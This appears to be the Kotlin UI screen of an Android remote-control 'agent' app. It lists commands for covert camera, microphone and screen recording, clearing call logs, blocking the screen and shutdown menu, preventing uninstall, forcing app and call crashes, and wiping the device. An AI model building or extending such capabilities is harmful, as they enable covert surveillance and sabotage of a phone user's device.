package com.sentrix.agent.ui

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.android.material.chip.Chip
import com.sentrix.agent.R
import com.sentrix.agent.util.Prefs
import com.sentrix.agent.util.RootUtil

/**
 * CommandsActivity — shows all available commands grouped by category.
 * Root-aware: restricted commands are dimmed with a tooltip on unrooted devices.
 */
class CommandsActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_commands)

        supportActionBar?.apply {
            title = "Available Commands"
            setDisplayHomeAsUpEnabled(true)
        }

        val isRooted = Prefs.isRooted
        val rv = findViewById<RecyclerView>(R.id.rvCategories)
        rv.layoutManager = LinearLayoutManager(this)
        rv.adapter = CategoryAdapter(CommandData.categories, isRooted)
    }

    override fun onSupportNavigateUp(): Boolean { finish(); return true }
}

// ── Data ──────────────────────────────────────────────────────────────────────

data class CommandItem(
    val name: String,
    val action: String,
    val requiresRoot: Boolean = false
)

data class Category(
    val name: String,
    val emoji: String,
    val commands: List<CommandItem>
)

object CommandData {
    val categories = listOf(
        Category("Surveillance", "📷", listOf(
            CommandItem("Screenshot",             "screenshot"),
            CommandItem("Front Camera Snap",      "front_cam"),
            CommandItem("Rear Camera Snap",       "rear_cam"),
            CommandItem("Start Mic Record",       "mic_start"),
            CommandItem("Stop Mic Record",        "mic_stop"),
            CommandItem("Start Screen Record",    "screen_capture_start"),
            CommandItem("Stop Screen Record",     "screen_capture_stop"),
            CommandItem("Front Video Record",     "front_video_record"),
            CommandItem("Rear Video Record",      "rear_video_record"),
            CommandItem("Stop Video Record",      "video_record_stop")
        )),
        Category("Connectivity", "📶", listOf(
            CommandItem("WiFi On",                "wifi_on",          requiresRoot = true),
            CommandItem("WiFi Off",               "wifi_off",         requiresRoot = true),
            CommandItem("Bluetooth On",           "bt_on",            requiresRoot = true),
            CommandItem("Bluetooth Off",          "bt_off",           requiresRoot = true),
            CommandItem("Mobile Data On",         "data_on",          requiresRoot = true),
            CommandItem("Mobile Data Off",        "data_off",         requiresRoot = true),
            CommandItem("Data Always On",         "data_always_on",   requiresRoot = true),
            CommandItem("Data Always On (Off)",   "data_normall",     requiresRoot = true),
            CommandItem("Hotspot On",             "hotspot_on",       requiresRoot = true),
            CommandItem("Hotspot Off",            "hotspot_off",      requiresRoot = true),
            CommandItem("Airplane Mode On",       "airplane_on",      requiresRoot = true),
            CommandItem("Airplane Mode Off",      "airplane_off",     requiresRoot = true)
        )),
        Category("Security", "🔐", listOf(
            CommandItem("Screen Off Mode On",         "screen_off_on",        requiresRoot = true),
            CommandItem("Screen Off Mode Off",        "screen_off_off",       requiresRoot = true),
            CommandItem("Barrel Roll On",             "barrel_roll_on",       requiresRoot = true),
            CommandItem("Barrel Roll Off",            "barrel_roll_off",      requiresRoot = true),
            CommandItem("Block Screen Touch",         "screen_block_on",      requiresRoot = true),
            CommandItem("Unblock Screen Touch",       "screen_block_off",     requiresRoot = true),
            CommandItem("Disable Shutdown Menu",      "nopoweroff_on",        requiresRoot = true),
            CommandItem("Enable Shutdown Menu",       "nopoweroff_off",       requiresRoot = true),
            CommandItem("Enable Apps Crash",          "appcrash_on",          requiresRoot = true),
            CommandItem("Disable Apps Crash",         "appcrash_off",         requiresRoot = true),
            CommandItem("Enable Call Crash",          "callcrash_on",         requiresRoot = true),
            CommandItem("Disable Call Crash",         "callcrash_off",        requiresRoot = true),
            CommandItem("Enable Connectivity Crash",  "servicecrash_on",      requiresRoot = true),
            CommandItem("Disable Connectivity Crash", "servicecrash_off",     requiresRoot = true),
            CommandItem("Enable Intruder Actions",    "intruder_on",          requiresRoot = true),
            CommandItem("Disable Intruder Actions",   "intruder_off",         requiresRoot = true),
            CommandItem("Enable Statusbar Crash",     "statusbarcrash_on",    requiresRoot = true),
            CommandItem("Disable Statusbar Crash",    "statusbarcrash_off",   requiresRoot = true),
            CommandItem("Kill All Apps",              "kill_all_apps",        requiresRoot = true),
            CommandItem("Loud Ring On",               "loud_ring_on"),
            CommandItem("Loud Ring Off",              "loud_ring_off"),
            CommandItem("Auto Speak On",              "speak_on",             requiresRoot = true),
            CommandItem("Auto Speak Off",             "speak_off",            requiresRoot = true),
            CommandItem("Disable App Uninstall",      "disable_uninstall",    requiresRoot = true),
            CommandItem("Enable App Uninstall",       "enable_uninstall",     requiresRoot = true),
            CommandItem("SIM Change Trigger On",      "enable_simchange"),
            CommandItem("SIM Change Trigger Off",     "disable_simchange"),
            CommandItem("Lock Screen",                "lock_screen",          requiresRoot = true),
            CommandItem("Reboot Device",              "reboot",               requiresRoot = true),
            CommandItem("Wipe Device ⚠️",             "wipe_device",          requiresRoot = true)
        )),
        Category("App Control", "📦", listOf(
            CommandItem("Disable Play Store",     "play_disable",     requiresRoot = true),
            CommandItem("Enable Play Store",      "play_enable",      requiresRoot = true)
        )),
        Category("Anti-Theft", "🚨", listOf(
            CommandItem("Track Location",         "track_location"),
            CommandItem("Trigger Anti-Theft",     "theft_on"),
            CommandItem("Stop Anti-Theft",        "theft_off")
        )),
        Category("Miscellaneous", "⚙️", listOf(
            CommandItem("Home Screen",            "home",             requiresRoot = true),
            CommandItem("Back Button",            "back_button",      requiresRoot = true),
            CommandItem("Close All Apps",         "close_all",        requiresRoot = true),
            CommandItem("Collapse Status Bar",    "collaspe_bar",     requiresRoot = true),
            CommandItem("Flashlight On",          "torch_on"),
            CommandItem("Flashlight Off",         "torch_off"),
            CommandItem("Vibrate Device",         "vibrate"),
            CommandItem("Clear Call Logs",        "clear_call_logs",  requiresRoot = true),
            CommandItem("Screen Off",             "screen_off",       requiresRoot = true),
            CommandItem("Screen On",              "screen_on",        requiresRoot = true),
            CommandItem("Total Launcher",         "launcher_on",      requiresRoot = true),
            CommandItem("T-UI Launcher",          "launcher_off",     requiresRoot = true),
            CommandItem("Sudo Kill",              "sudo_kill",        requiresRoot = true),
            CommandItem("Volume Ring Max",        "vol_ring_max"),
            CommandItem("Volume Ring Zero",       "vol_ring_zero"),
            CommandItem("Volume Media Max",       "vol_media_max"),
            CommandItem("Volume Media Zero",      "vol_media_zero"),
            CommandItem("Loud Alarm",             "loud_alarm")
        ))
    )
}

// ── Adapters ──────────────────────────────────────────────────────────────────

class CategoryAdapter(
    private val categories: List<Category>,
    private val isRooted: Boolean
) : RecyclerView.Adapter<CategoryAdapter.VH>() {

    inner class VH(v: View) : RecyclerView.ViewHolder(v) {
        val title:    TextView        = v.findViewById(R.id.tvCategoryTitle)
        val chipContainer: ViewGroup  = v.findViewById(R.id.chipContainer)
    }

    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): VH {
        val v = LayoutInflater.from(parent.context)
            .inflate(R.layout.item_category, parent, false)
        return VH(v)
    }

    override fun getItemCount() = categories.size

    override fun onBindViewHolder(holder: VH, position: Int) {
        val cat = categories[position]
        holder.title.text = "${cat.emoji}  ${cat.name}"
        holder.chipContainer.removeAllViews()

        cat.commands.forEach { cmd ->
            val chip = Chip(holder.itemView.context).apply {
                text = cmd.name
                isClickable = false
                isCheckable = false

                if (cmd.requiresRoot && !isRooted) {
                    // Dimmed — root required
                    alpha = 0.45f
                    setChipBackgroundColorResource(R.color.surface3)
                    setTextColor(context.getColor(R.color.text_secondary))
                    chipIcon = context.getDrawable(android.R.drawable.ic_lock_lock)
                    isChipIconVisible = true
                    chipIconSize = 14f
                } else {
                    // Available
                    alpha = 1f
                    setChipBackgroundColorResource(R.color.accent_dim)
                    setTextColor(context.getColor(R.color.text_primary))
                }
            }
            holder.chipContainer.addView(chip)
        }
    }
}